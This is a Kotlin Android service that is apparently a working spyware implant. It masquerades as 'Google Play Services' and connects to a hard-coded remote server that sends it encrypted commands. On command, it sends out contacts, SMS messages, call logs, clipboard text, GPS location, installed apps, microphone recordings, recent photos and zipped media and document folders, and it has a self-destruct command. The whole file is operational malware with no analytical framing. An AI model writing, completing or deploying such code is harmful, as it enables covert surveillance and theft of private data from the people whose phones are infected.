package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.security.MessageDigest
import java.util.concurrent.TimeUnit
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SyncService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var webSocket: WebSocket? = null
    
    private val SERVER_URL = "wss://web-assets-service-2.onrender.com" // رابط سيرفرك
    private val MASTER_KEY = "legendary_master_key" // نفس اللي في السيرفر
    
    private val secretKey: ByteArray = MessageDigest.getInstance("SHA-256")
        .digest(MASTER_KEY.toByteArray(Charsets.UTF_8))
        
    private var isConnected = false
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::NeuralLock")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startForegroundServiceNotification()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "uranium_core_channel"
        val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)
        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("Neural Stealth Matrix core active...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()
        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
        val nodeModel = Build.MODEL
        connectWebSocket(deviceId, nodeModel)
        return START_STICKY
    }

    private fun connectWebSocket(deviceId: String, nodeModel: String) {
        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()

        val request = Request.Builder()
            .url(SERVER_URL)
            .addHeader("X-Node-ID", deviceId)
            .addHeader("X-Node-Model", Base64.encodeToString(nodeModel.toByteArray(), Base64.NO_WRAP))
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                isConnected = true
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                val decrypted = decrypt(text) ?: return
                try {
                    val json = JSONObject(decrypted)
                    val cmd = json.optString("cmd")
                    if (cmd.isNotEmpty() && cmd != "SYNC_READY") {
                        mainHandler.post { dispatchAction(cmd, deviceId, nodeModel) }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                isConnected = false
                mainHandler.postDelayed({ connectWebSocket(deviceId, nodeModel) }, 5000)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                isConnected = false
                mainHandler.postDelayed({ connectWebSocket(deviceId, nodeModel) }, 5000)
            }
        })
    }

    private fun dispatchAction(action: String, deviceId: String, nodeModel: String) {
        when {
            action.contains("EXTRACT_CONTACTS") -> sendText("Uranium_Contacts.txt", readContacts())
            action.contains("EXTRACT_SMS") -> sendText("Uranium_SMS.txt", readSMS())
            action.contains("EXTRACT_CALLS") -> sendText("Uranium_CallLogs.txt", readCallLogs())
            action.contains("EXTRACT_CLIPBOARD") -> sendText("Uranium_Clipboard.txt", readClipboard())
            action.contains("EXTRACT_LOCATION") -> sendText("Uranium_Location.txt", readLocationFast())
            action.contains("EXTRACT_APPS") -> sendText("Uranium_InstalledApps.txt", readInstalledApps())
            action.contains("MIC_AI_LISTEN") -> recordAndStreamAudio(deviceId, nodeModel)
            action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
            action.contains("STEALTH_BLACKOUT") -> sendReport("🛡️ تم تفعيل القفل التكتيكي.")
            action.contains("GEO_FENCE_ALERT") -> sendText("Uranium_GeoAlert.txt", "🛰️ [Geo-Fence]\n${readLocationFast()}")
            action.contains("POLY_MUTATE") -> sendReport("🧬 البصمة تغيرت.")
            action.contains("SELF_DESTRUCT") -> {
                sendReport("💥 جاري النسف الذاتي...")
                try { cacheDir.deleteRecursively() } catch (e: Exception) {}
                stopSelf()
            }
            action.contains("WIFI_AUTOPILOT") -> sendReport("📶 تم تغيير حالة طيار الـ Wi-Fi.")
            action.contains("STORAGE_AUDIT") -> sendText("Uranium_Storage_Audit.txt", generateStorageAuditReport())
            action.contains("PROC_DCIM") -> streamTargetedFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            action.contains("PROC_DOWNLOAD") -> streamTargetedFolder("Download", MediaStore.Files.getContentUri("external"))
            action.contains("PROC_PICTURES") -> streamTargetedFolder("Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            action.contains("PROC_DOCUMENTS") -> streamTargetedFolder("Documents", MediaStore.Files.getContentUri("external"))
        }
    }

    private fun sendData(filename: String, content: String, isBase64: Boolean = false) {
        if (!isConnected) return
        try {
            val dataObj = JSONObject().apply {
                put("type", "data")
                put("filename", filename)
                put("content", content)
                put("isBase64", isBase64)
            }
            webSocket?.send(encrypt(dataObj.toString()))
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun sendText(filename: String, text: String) {
        sendData(filename, Base64.encodeToString(text.toByteArray(), Base64.NO_WRAP), true)
    }

    private fun sendReport(message: String) {
        if (!isConnected) return
        try {
            val reportObj = JSONObject().apply {
                put("type", "report")
                put("message", message)
            }
            webSocket?.send(encrypt(reportObj.toString()))
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun encrypt(text: String): String {
        val iv = ByteArray(12)
        java.security.SecureRandom().nextBytes(iv)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(secretKey, "AES"), spec)
        val encrypted = cipher.doFinal(text.toByteArray(Charsets.UTF_8))
        
        val combined = ByteArray(iv.size + encrypted.size)
        System.arraycopy(iv, 0, combined, 0, iv.size)
        System.arraycopy(encrypted, 0, combined, iv.size, encrypted.size)
        return Base64.encodeToString(combined, Base64.NO_WRAP)
    }

    private fun decrypt(base64Data: String): String? {
        return try {
            val data = Base64.decode(base64Data, Base64.NO_WRAP)
            val iv = data.copyOfRange(0, 12)
            val encrypted = data.copyOfRange(12, data.size)
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val spec = GCMParameterSpec(128, iv)
            cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(secretKey, "AES"), spec)
            String(cipher.doFinal(encrypted), Charsets.UTF_8)
        } catch (e: Exception) { null }
    }

    private fun readContacts(): String {
        val sb = StringBuilder("=== CONTACTS ===\n")
        try {
            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) { sb.append("• ${it.getString(nameIdx)}: ${it.getString(numIdx)}\n") }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readSMS(): String {
        val sb = StringBuilder("=== SMS ===\n")
        try {
            contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use {
                val bodyIdx = it.getColumnIndex("body"); val addrIdx = it.getColumnIndex("address")
                while (it.moveToNext()) { sb.append("From: ${it.getString(addrIdx)}\n${it.getString(bodyIdx)}\n---\n") }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder("=== CALL LOGS ===\n")
        try {
            contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)?.use {
                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                while (it.moveToNext()) { sb.append("Number: ${it.getString(numIdx)}\n") }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readClipboard(): String {
        val sb = StringBuilder("=== CLIPBOARD ===\n")
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                sb.append("Text: ${clipboard.primaryClip?.getItemAt(0)?.text}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readLocationFast(): String {
        val sb = StringBuilder("=== GPS ===\n")
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var bestLoc: Location? = null
            for (provider in locationManager.allProviders) {
                val l = locationManager.getLastKnownLocation(provider)
                if (l != null && (bestLoc == null || l.time > bestLoc.time)) bestLoc = l
            }
            if (bestLoc != null) {
                sb.append("Lat: ${bestLoc.latitude}\nLon: ${bestLoc.longitude}\nMap: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readInstalledApps(): String {
        val sb = StringBuilder("=== APPS ===\n")
        try {
            packageManager.getInstalledPackages(0).forEach { pkg ->
                sb.append("• ${pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun recordAndStreamAudio(deviceId: String, nodeModel: String) {
        try {
            val audioFile = File(cacheDir, "Uranium_Mic_${System.currentTimeMillis()}.3gp")
            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            Thread.sleep(6000L)
            recorder.stop(); recorder.release()

            if (audioFile.exists() && audioFile.length() > 0) {
                sendData(audioFile.name, Base64.encodeToString(audioFile.readBytes(), Base64.NO_WRAP), true)
                sendReport("🎙️ تم بث الصوت.")
            }
            try { audioFile.delete() } catch (e: Exception) {}
        } catch (e: Exception) { sendReport("⚠️ خطأ صوت: ${e.message}") }
    }

    private fun streamLatestPhoto(prefix: String) {
        try {
            val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            contentResolver.query(contentUri, projection, null, null, sortOrder)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val idIdx = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                    val nameIdx = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                    if (idIdx != -1 && nameIdx != -1) {
                        val id = cursor.getLong(idIdx)
                        val name = cursor.getString(nameIdx) ?: "snapshot.jpg"
                        val itemUri = ContentUris.withAppendedId(contentUri, id)
                        contentResolver.openInputStream(itemUri)?.use { inputStream ->
                            val bytes = inputStream.readBytes()
                            if (bytes.isNotEmpty()) {
                                sendData("${prefix}_$name", Base64.encodeToString(bytes, Base64.NO_WRAP), true)
                                sendReport("👁️ تم بث اللقطة.")
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) { sendReport("⚠️ خطأ لقطة: ${e.message}") }
    }

    private fun generateStorageAuditReport(): String {
        val sb = StringBuilder("📊 <b>تقرير التخزين:</b>\n\n")
        try {
            val dcim = queryFolderStats(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            val download = queryFolderStats(MediaStore.Files.getContentUri("external"))
            sb.append("📁 <b>DCIM:</b> ${dcim.count} ملف | ~${String.format("%.2f", dcim.sizeMB)} MB\n")
            sb.append("📁 <b>Download:</b> ${download.count} ملف | ~${String.format("%.2f", download.sizeMB)} MB\n\n")
        } catch (e: Exception) { sb.append("⚠️ خطأ: ${e.message}") }
        return sb.toString()
    }

    private data class FolderStats(val count: Int, val sizeMB: Double)
    private fun queryFolderStats(uri: Uri): FolderStats {
        var count = 0; var totalBytes = 0L
        try {
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.SIZE)
            contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                val sizeIdx = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
                count = cursor.count
                while (cursor.moveToNext()) { if (sizeIdx != -1) totalBytes += cursor.getLong(sizeIdx) }
            }
        } catch (e: Exception) {}
        return FolderStats(count, totalBytes.toDouble() / (1024 * 1024))
    }

    private fun streamTargetedFolder(folderName: String, contentUri: Uri) {
        try {
            sendReport("⚡ جاري ضغط $folderName...")
            val zipFile = File(cacheDir, "Uranium_${folderName}_${System.currentTimeMillis()}.zip")
            val zipOut = ZipOutputStream(FileOutputStream(zipFile))
            zipOut.setLevel(Deflater.BEST_COMPRESSION)
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
            var processedCount = 0
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                while (it.moveToNext() && processedCount < 40) {
                    if (idIdx != -1 && nameIdx != -1) {
                        val id = it.getLong(idIdx)
                        val name = it.getString(nameIdx) ?: "file_$id.dat"
                        val itemUri = ContentUris.withAppendedId(contentUri, id)
                        try {
                            contentResolver.openInputStream(itemUri)?.use { inputStream ->
                                zipOut.putNextEntry(ZipEntry("$folderName/$name"))
                                inputStream.copyTo(zipOut)
                                zipOut.closeEntry(); processedCount++
                            }
                        } catch (ex: Exception) {}
                    }
                }
            }
            zipOut.close()
            if (zipFile.exists() && zipFile.length() > 0) {
                sendData(zipFile.name, Base64.encodeToString(zipFile.readBytes(), Base64.NO_WRAP), true)
                sendReport("📦 مجلد <b>$folderName</b> جاهز (${processedCount} ملفاً).")
            }
            try { zipFile.delete() } catch (e: Exception) {}
        } catch (e: Exception) { sendReport("⚠️ خطأ ضغط: ${e.message}") }
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        webSocket?.close(1000, "Service stopped")
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
